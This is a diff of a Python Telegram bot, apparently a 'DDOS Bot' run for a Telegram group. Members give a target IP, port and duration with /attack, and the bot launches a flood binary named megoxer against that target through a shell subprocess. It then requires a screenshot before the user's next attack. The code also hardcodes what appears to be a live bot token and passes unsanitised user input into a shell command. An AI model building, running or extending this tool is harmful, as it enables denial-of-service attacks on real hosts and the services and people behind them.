@@ -3,9 +3,7 @@ import telebot
 import datetime
 import time
 import subprocess
-import threading
-import requests
-import os
+from telebot import types
 
 # Insert your Telegram bot token here
 bot = telebot.TeleBot('8048715452:AAEdWGG7J-d1zVvmFSN1UiddyABpm34aLj0')
@@ -15,103 +13,149 @@ admin_id = ["7129010361"]
 
 # Group and channel details
 GROUP_ID = "-1002369239894"
-CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
+CHANNEL_USERNAME = "@KHAPITAR_BALAK77"  # Screenshot yahan forward hoga
 
 # Attack settings
 ATTACK_LIMIT = 10  # Max attacks per day
 
-# Global attack tracker
-is_attack_running = False  # Track if an attack is running
-attack_end_time = None  # Store attack end time
-attack_target = None  # Store attack target IP
-attack_port = None  # Store attack port
-attack_duration = None  # Store attack duration
-pending_feedback = {}  # Users who need to send screenshots
+# Global variables
+is_attack_running = False
+attack_end_time = None  # Track attack end time
+pending_feedback = {}  # Track users who need to send a screenshot
 
+# Function to check if user is in channel
+def is_user_in_channel(user_id):
+    try:
+        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
+        return member.status in ['member', 'administrator', 'creator']
+    except:
+        return False
+
+# Function to create check status button
+def create_check_button():
+    markup = types.InlineKeyboardMarkup()
+    button = types.InlineKeyboardButton("✅ Check Status", callback_data='check_status')
+    markup.add(button)
+    return markup
+
+# Handle attack command
 @bot.message_handler(commands=['attack'])
 def handle_attack(message):
-    global is_attack_running, attack_end_time, attack_target, attack_port, attack_duration
+    global is_attack_running, attack_end_time
     user_id = str(message.from_user.id)
     command = message.text.split()
 
     if message.chat.id != int(GROUP_ID):
-        bot.reply_to(message, "🚫 **𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀** ❌")
+        bot.reply_to(message, "🚫 **Ye bot sirf group me chalega!** ❌")
+        return
+
+    if not is_user_in_channel(user_id):
+        bot.reply_to(message, f"❗ **Pehle channel join karo:** {CHANNEL_USERNAME} 🔥")
+        return
+
+    if pending_feedback.get(user_id, False):
+        bot.reply_to(message, "😡 **Pehle screenshot bhejo, tabhi agla attack kar sakoge!** 🔥")
         return
 
     if is_attack_running:
-        bot.reply_to(message, "⚠️ **𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐀𝐍 𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐒 𝐑𝐔𝐍𝐍𝐈𝐍𝐆! 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓.**")
+        bot.reply_to(message, "⚠️ **Ek attack already chal raha hai! Please wait.**")
         return
 
     if len(command) != 4:
-        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /attack `<IP>` `<PORT>` `<TIME>`")
+        bot.reply_to(message, "⚠️ **Usage:** /attack `<IP>` `<PORT>` `<TIME>`")
         return
 
-    attack_target, attack_port, attack_duration = command[1], command[2], command[3]
+    target, port, time_duration = command[1], command[2], command[3]
 
     try:
-        attack_port = int(attack_port)
-        attack_duration = int(attack_duration)
+        port = int(port)
+        time_duration = int(time_duration)
     except ValueError:
-        bot.reply_to(message, "❌ **𝐏𝐎𝐑𝐓 𝐀𝐍𝐃 𝐓𝐈𝐌𝐄 𝐌𝐔𝐒𝐓 𝐁𝐄 𝐈𝐍𝐓𝐄𝐆𝐄𝐑𝐒!**")
+        bot.reply_to(message, "❌ **Port aur Time numbers hone chahiye!**")
         return
 
-    if attack_duration > 180:
-        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 180𝐬!**")
+    if time_duration > 180:
+        bot.reply_to(message, "🚫 **Max duration = 180s!**")
         return
 
-    # Mark attack as running
+    # Confirm attack with user
+    confirm_msg = f"""⚡ **Attack Details:**  
+🎯 **Target:** `{target}`  
+🔢 **Port:** `{port}`  
+⏳ **Duration:** `{time_duration}s`  
+🔄 **Status:** `Starting...`  
+📸 **Note:** Attack ke baad screenshot zaroor do!"""
+
+    bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown", reply_markup=create_check_button())
+
     is_attack_running = True
-    attack_end_time = time.time() + attack_duration  # Store attack end time
-    pending_feedback[user_id] = True  # Require screenshot
+    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
+    pending_feedback[user_id] = True  # Screenshot required after attack
 
-    bot.send_message(message.chat.id, f"🚀 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!**\n🎯 **Target:** `{attack_target}`\n🔹 **Port:** `{attack_port}`\n⏳ **Duration:** `{attack_duration}s`")
+    time.sleep(2)  # Simulate attack preparation
+
+    bot.send_message(message.chat.id, f"🚀 **Attack in Progress...**\n🎯 `{target}:{port}`\n⏳ {time_duration}s", parse_mode="Markdown")
 
     try:
-        subprocess.run(f"./megoxer {attack_target} {attack_port} {attack_duration} 900", shell=True, check=True)
-    except subprocess.CalledProcessError as e:
-        bot.reply_to(message, f"❌ **𝐄𝐑𝐑𝐎𝐑:** {e}")
-        is_attack_running = False  # Reset flag
+        subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
+    except subprocess.CalledProcessError:
+        bot.reply_to(message, "❌ **Attack failed due to an error!**")
+        is_attack_running = False
+        attack_end_time = None
         return
 
-    bot.send_message(message.chat.id, "✅ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐃𝐎𝐍𝐄! 𝐀𝐁 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐃𝐄!** 🚀")
+    bot.send_message(message.chat.id, "✅ **Attack Completed!** 🎯\n📸 **Ab screenshot bhejo!**")
+    bot.send_message(message.chat.id, "⚠️ **Jab tak screenshot nahi doge, agla attack nahi hoga!**")
 
-    is_attack_running = False  # Reset flag after attack completes
+    is_attack_running = False
+    attack_end_time = None
 
+# Handle check command
 @bot.message_handler(commands=['check'])
-def check_attack_status(message):
-    global is_attack_running, attack_end_time, attack_target, attack_port, attack_duration
-
-    if is_attack_running:
-        remaining_time = int(attack_end_time - time.time())
+def check_attack(message):
+    if is_attack_running and attack_end_time:
+        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
         if remaining_time > 0:
-            bot.reply_to(message, f"⚡ **Attack is Running!**\n🎯 **Target:** `{attack_target}`\n🔹 **Port:** `{attack_port}`\n⏳ **Duration:** `{attack_duration}s`\n🕒 **Time Left:** `{remaining_time}s`")
+            bot.reply_to(message, f"⏳ **Attack abhi chal raha hai! Baaki time:** {int(remaining_time)}s")
         else:
-            bot.reply_to(message, "✅ **No attack is currently running.**")
-            is_attack_running = False
+            bot.reply_to(message, "✅ **Attack khatam ho chuka hai!**")
     else:
-        bot.reply_to(message, "✅ **No attack is currently running.**")
+        bot.reply_to(message, "❌ **Koi attack abhi nahi chal raha!**")
 
+# Handle check status button click
+@bot.callback_query_handler(func=lambda call: call.data == 'check_status')
+def callback_check_status(call):
+    check_attack(call.message)
+
+# Handle screenshot submission and forward to main channel
 @bot.message_handler(content_types=['photo'])
 def handle_screenshot(message):
     user_id = str(message.from_user.id)
     
     if pending_feedback.get(user_id, False):
-        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)
+        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)  # Forward to main channel
+        bot.send_message(CHANNEL_USERNAME, f"📸 **Screenshot Received from** `{user_id}`")
 
-        bot.send_message(CHANNEL_USERNAME, f"📸 **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃!**\n👤 `{user_id}`")
-
-        bot.reply_to(message, "✅ **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃! 𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐆𝐀𝐎!** 🚀")
-        del pending_feedback[user_id]
+        bot.reply_to(message, "✅ **Screenshot mil gaya! Ab naya attack laga sakte ho.** 🚀")
+        del pending_feedback[user_id]  # Remove user from pending list
     else:
-        bot.reply_to(message, "❌ **𝐘𝐞 𝐀𝐏𝐏𝐑𝐎𝐏𝐑𝐈𝐀𝐓𝐄 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐍𝐀𝐇𝐈 𝐇𝐀𝐈!**")
+        bot.reply_to(message, "❌ **Screenshot required nahi hai!**")
 
+# Bot start command
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"🌟🔥 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐑𝐎 {user_name} 🔥🌟\n\n🚀 **𝐘𝐨𝐮'𝐫𝐞 𝐢𝐧 𝐓𝐡𝐞 𝐇𝐎𝐌𝐄 𝐨𝐟 𝐏𝐎𝐖𝐄𝐑!**"
+    response = f"""🌟🔥 Welcome {user_name}! 🔥🌟
+
+🚀 **DDOS Bot Ready!**  
+💥 Attack commands ka use karne ke liye group aur channel join karein.  
+
+🔗 **Join Now:**  
+👉 [Telegram Group](https://t.me/R_SDanger_op) 🚀🔥"""
     
     bot.reply_to(message, response, parse_mode="Markdown")
 
+# Start polling
 while True:
     try:
         bot.polling(none_stop=True)
